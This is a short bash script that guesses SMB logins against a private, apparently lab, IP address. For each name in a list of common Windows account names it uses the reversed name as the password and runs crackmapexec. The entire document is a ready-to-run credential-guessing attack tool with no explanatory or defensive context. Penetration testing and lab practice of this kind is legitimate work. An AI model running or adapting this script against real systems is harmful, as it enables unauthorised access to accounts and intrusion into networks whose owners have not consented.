#!/bin/bash

# Target IP
TARGET_IP="192.168.56.11"

# Usernames list (modify or load from file)
USERNAMES=("administrator" "sql_svc" "backup" "guest")

# Function to reverse a string
reverse_string() {
    echo "$1" | rev
}

# Loop through each username and use its reverse as the password
for USER in "${USERNAMES[@]}"; do
    REVERSED_PASS=$(reverse_string "$USER")
    echo "Trying $USER:$REVERSED_PASS ..."
    crackmapexec smb $TARGET_IP -u "$USER" -p "$REVERSED_PASS"
done
